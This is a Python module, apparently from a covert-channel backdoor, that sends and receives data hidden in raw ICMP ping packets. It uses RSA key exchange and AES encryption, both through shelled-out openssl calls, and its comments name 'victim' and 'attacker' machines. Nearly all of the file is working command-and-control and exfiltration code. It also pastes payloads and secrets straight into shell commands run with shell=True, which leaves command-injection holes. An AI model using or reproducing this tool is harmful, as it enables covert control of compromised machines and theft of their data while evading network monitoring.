from socket import socket, AF_INET, SOCK_RAW, IPPROTO_ICMP
from struct import pack, unpack
from subprocess import check_output
from re import search, DOTALL
from os import remove

ICMP_ECHO_REPLY = 0
ICMP_ECHO_REQUEST = 8
MAX_LEN = 65506


class ICMP():
    def __init__(self: object, host: str) -> None:
        self.host = host
        self.connection = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

    def send_ping(self: object, id: int, payload: bytes, type: int, secret: str=None) -> tuple:  # noqa: E252
        # if payload exceeds MAX_LEN, change payload to error message
        if len(payload) > MAX_LEN:
            payload = b'Message too long to send!'

        # create an ICMP packet (if secret is given, encrypt the data)
        header = pack("bbHHh", type, 0, 0, id, 1)
        data = b'\x02' + (AES.encrypt(payload.decode(), secret) if secret else payload)
        checksum = self.checksum(header + data)
        header = pack('bbHHh', type, 0, checksum, id, 1)
        packet = header + data

        # send the ICMP packet to a particular host
        self.connection.sendto(packet, (self.host, 0))

    def receive_ping(self: object, packet_id: int, secret: str=None) -> tuple:  # noqa: E252
        # try to receive a packet; else, return None
        try:
            packet, address = self.connection.recvfrom(MAX_LEN + 8)
        except Exception:
            return None, None

        # unpack the ICMP packet
        header = packet[20:28]
        type, code, checksum, id, sequence = unpack('bbHHh', header)

        # if the id of the received and expected packet does not match, wait for another packet
        if id != packet_id:
            return self.receive_ping(packet_id, secret)

        # find the payload part of the packet
        payload = packet[packet.rfind(b'\x01\x00\x02') + 3:]
        # decrypt the payload if a secret is provided
        payload = AES.decrypt(payload.decode(), secret) if secret else payload

        # return the payload and the address of the sender
        return payload.strip(), address[0]

    # calculate the checksum of the packet
    def checksum(self: object, message: bytes) -> int:
        s = 0

        for i in range(0, len(message) - 1, 2):
            s += (message[i] + (message[i + 1] << 8))

        return ~(s + (s >> 16)) & 0xffff


# the methods in this class are only used for key exchange
class RSA():
    # generate a private RSA key needed for key exchange by using openssl (used only on the victim machine)
    def generate_private() -> bytes:
        output = check_output('openssl genrsa 2048 2>/dev/null', shell=True).decode()
        private_key = search(r'-----BEGIN RSA PRIVATE KEY.*END RSA PRIVATE KEY-----', output, DOTALL)

        if private_key:
            return private_key.group(0).encode()

        return None

    # generate public RSA key needed for key exchange by using openssl (the key is later sent from the victim to the attacker machine)
    def generate_public(private_key: str) -> bytes:
        output = check_output('echo "' + private_key + '" | openssl rsa -pubout 2>/dev/null', shell=True).decode()
        public_key = search(r'-----BEGIN PUBLIC KEY.*END PUBLIC KEY-----', output, DOTALL)

        if public_key:
            return public_key.group(0).encode()

        return None

    # encrypt the generated secret with the RSA public key by using openssl (used only on the attacker machine)
    def encrypt_secret(secret: str, public_key: bytes) -> bytes:
        with open('pub.pem', 'wb') as fout:
            fout.write(public_key)

        output = check_output('echo "' + secret + '" | openssl rsautl -encrypt -inkey pub.pem -pubin 2>/dev/null', shell=True)
        remove('pub.pem')

        return output

    # decrypt the generated secret with the RSA private key by using openssl (used only on the victim machine)
    def decrypt_secret(secret: bytes, private_key: bytes) -> str:
        with open('prv.pem', 'wb') as fout:
            fout.write(private_key)

        with open('secret.enc', 'wb') as fout:
            fout.write(secret)

        output = check_output('openssl rsautl -decrypt -inkey prv.pem -in secret.enc 2>/dev/null', shell=True).decode()

        remove('prv.pem')
        remove('secret.enc')

        return output.strip()


# the methods in this class use the exchanged key/secret in order to perform encryption/decryption
class AES():
    # use the exchanged secret to encrypt the payload by using openssl
    def encrypt(payload: str, secret: str) -> bytes:
        output = check_output('echo "' + payload.strip() + '" | openssl enc -aes-256-cbc -a -e -k "' + secret + '" -nosalt 2>/dev/null', shell=True)

        return output

    # use the exchanged secret to decrypt the payload by using openssl
    def decrypt(payload: str, secret: str) -> bytes:
        output = check_output('echo "' + payload.strip() + '" | openssl enc -aes-256-cbc -a -d -k "' + secret + '" -nosalt 2>/dev/null', shell=True)

        return output
